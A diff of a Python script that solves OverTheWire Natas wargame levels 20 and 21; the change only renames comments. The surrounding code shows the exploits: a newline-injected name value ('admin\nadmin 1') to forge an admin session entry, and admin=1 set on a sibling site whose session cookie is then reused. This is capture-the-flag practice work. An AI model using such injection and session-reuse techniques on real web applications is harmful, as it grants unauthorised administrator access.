@@ -10,13 +10,13 @@ def natas20():
     password = pwinput.pwinput(prompt='Password: ', mask='*')
     url = "http://{}.natas.labs.overthewire.org/".format(user)
 
-    #FIRST PETITION
+    #FIRST REQUEST
 
     key = dict(name='admin\nadmin 1')
     response = requests.get(url, auth=(user, password), params=key)
     sid = response.cookies['PHPSESSID']
 
-    #SECOND PETITION
+    #SECOND REQUEST
 
     cookies = dict(PHPSESSID=sid)
     response = requests.get(url, auth=(user, password), params=key, cookies=cookies)
@@ -40,14 +40,14 @@ def natas21(user21, password21):
     url21 = "http://{}.natas.labs.overthewire.org/".format(user21)
     urlExperimenter = "http://natas21-experimenter.natas.labs.overthewire.org"
 
-    #FIRST PETITION
+    #FIRST REQUEST
 
     session = requests.session()
     key = dict(submit=1, admin=1)
     response = session.post(urlExperimenter, params=key, auth=auth)
     sid = session.cookies['PHPSESSID']
 
-    #SECOND PETITION
+    #SECOND REQUEST
 
     cookies = dict(PHPSESSID=sid)
     response = session.get(url21, cookies=cookies, auth=auth)
